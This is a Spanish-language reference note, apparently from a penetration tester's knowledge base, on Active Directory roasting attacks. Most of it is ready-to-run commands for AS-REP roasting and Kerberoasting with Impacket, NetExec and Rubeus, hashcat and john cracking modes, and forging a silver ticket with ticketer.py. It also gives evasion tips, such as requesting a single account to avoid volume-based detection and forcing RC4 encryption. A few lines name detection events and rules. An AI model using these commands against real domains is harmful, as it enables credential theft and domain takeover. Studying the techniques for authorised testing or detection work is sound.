---
tipo: meta
aliases:
  - Roasting
  - GetUserSPNs
  - GetNPUsers
  - silver ticket
tags:
  - meta/referencia
  - dominio/ad
---

# AD roasting - matriz de referencia

> [!info] Referencia pura, no un zettel
> Las dos técnicas que piden material cifrado al KDC y lo rompen fuera de línea. El criterio está en [[Kerberoasting]] y [[AS-REP roasting]].

## 0. Cuál de las dos

Se parecen en el resultado —un hash que se rompe sin tocar la red— y se diferencian en qué hace falta para pedirlo.

| | AS-REP roasting | Kerberoasting |
|---|---|---|
| Necesita credencial | **No** | Sí, cualquiera del dominio |
| Objetivo | Cuentas con preautenticación deshabilitada | Cuentas con SPN registrado |
| Qué se rompe | La contraseña del usuario | La contraseña de la cuenta de servicio |
| Cuántas suele haber | Pocas, y son un descuido | Muchas, y son la norma |
| Evento | `4768` | `4769` |
| Modo de hashcat | `18200` | `13100` |

AS-REP va primero porque no cuesta nada. Kerberoast rinde más porque las cuentas de servicio tienen contraseñas viejas puestas a mano.

## 1. AS-REP roasting

`GetNPUsers.py dominio.local/ -usersfile usuarios.txt -no-pass -dc-ip 10.0.0.10`
Sin credencial. Necesita una lista de nombres válidos — la saca [[AD enumeración - matriz de referencia]].

`GetNPUsers.py dominio.local/user:'pass' -request -format hashcat -outputfile hashes.txt`
Con credencial. Consulta el directorio y pide solo las cuentas que de verdad tienen el bit puesto, sin adivinar nombres.

`nxc ldap 10.0.0.10 -u user -p 'pass' --asreproast hashes.txt`

`Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt`
Desde Windows.

Formato del hash: `$krb5asrep$23$usuario@DOMINIO.LOCAL:...`

## 2. Kerberoasting

`GetUserSPNs.py dominio.local/user:'pass' -dc-ip 10.0.0.10`
Sin `-request` solo **lista** las cuentas con SPN y cuándo cambiaron la contraseña por última vez. Vale correrlo primero: una cuenta cuya contraseña se fijó hace ocho años es la que se va a romper.

`GetUserSPNs.py dominio.local/user:'pass' -request -outputfile hashes.txt`
Ahora sí pide los tickets.

`GetUserSPNs.py dominio.local/user:'pass' -request-user svc_sql`
Una sola cuenta. Es la versión discreta: pedir los treinta SPN de golpe es lo que dispara [[Tickets de servicio con cifrado débil en volumen]].

`nxc ldap 10.0.0.10 -u user -p 'pass' --kerberoasting hashes.txt`

`Rubeus.exe kerberoast /outfile:hashes.txt`
`Rubeus.exe kerberoast /user:svc_sql /nowrap`

Formato del hash: `$krb5tgs$23$*usuario$DOMINIO.LOCAL$servicio*$...`

> [!warning] El `23` del formato es el que decide si esto sirve
> Es el tipo de cifrado: `23` es RC4 y se rompe rápido. Si sale `18`, es AES-256 y el mismo ataque cuesta órdenes de magnitud más. `Rubeus.exe kerberoast /tgtdeleg` fuerza RC4 en dominios que todavía lo permiten — y pedir RC4 donde el resto del dominio usa AES es exactamente la anomalía en la que se ancla la detección.

## 3. Romper el hash

`hashcat -m 13100 hashes.txt rockyou.txt -r best64.rule`
Kerberoast (TGS-REP, RC4).

`hashcat -m 19700 hashes.txt rockyou.txt`
Kerberoast con AES-256, cuando no hubo forma de forzar RC4.

`hashcat -m 18200 hashes.txt rockyou.txt -r best64.rule`
AS-REP.

`john --wordlist=rockyou.txt --format=krb5tgs hashes.txt`

| Modo | Qué es |
|---|---|
| `13100` | TGS-REP, RC4 — Kerberoasting normal |
| `19700` | TGS-REP, AES-256 |
| `18200` | AS-REP, RC4 |
| `7500` | AS-REQ preauth, del `kerbrute` |

Las reglas importan más que el diccionario: las contraseñas de cuentas de servicio suelen ser el nombre de la empresa con un año y un signo.

## 4. Silver ticket — el atajo que evita romper nada

Si la cuenta de servicio ya cayó por otro lado y tenés su hash NT, no hace falta la contraseña en claro: se puede forjar el ticket de servicio directo.

`ticketer.py -nthash HASH -domain-sid S-1-5-21-... -domain dominio.local -spn MSSQLSvc/sql.dominio.local admin`

Sirve para ese servicio y nada más, y por eso mismo no toca al controlador de dominio: **no genera `4768` ni `4769`**. Es la contracara defensiva del [[Ticket de servicio sin ticket inicial previo]] — un silver ticket es justo el caso que esa regla busca.

## 5. Tabla de errores

| Lo que ves | Qué pasa |
|---|---|
| `No entries found!` en `GetUserSPNs` | Nadie tiene SPN, o solo lo tienen cuentas de máquina. Las de máquina no se rompen |
| `KDC_ERR_S_PRINCIPAL_UNKNOWN` | El SPN no existe o está mal escrito. Copiarlo de la salida del listado, no a mano |
| `Clock skew too great` | Más de cinco minutos de diferencia. `sudo ntpdate 10.0.0.10` |
| Hash con `$18$` | AES-256. Cambiar a `-m 19700` o buscar forzar RC4 |
| Hashcat no rompe nada en horas | Contraseña de cuenta de servicio generada al azar. Es el caso normal en un dominio bien administrado; seguir por otra rama |
| `KDC_ERR_ETYPE_NOSUPP` | El dominio ya no acepta RC4. No hay atajo, el hash sale en AES |

## Relacionadas

[[MOC - Active Directory]] · [[Kerberoasting]] · [[AS-REP roasting]] · [[AD enumeración - matriz de referencia]] · [[AD persistencia - matriz de referencia]]
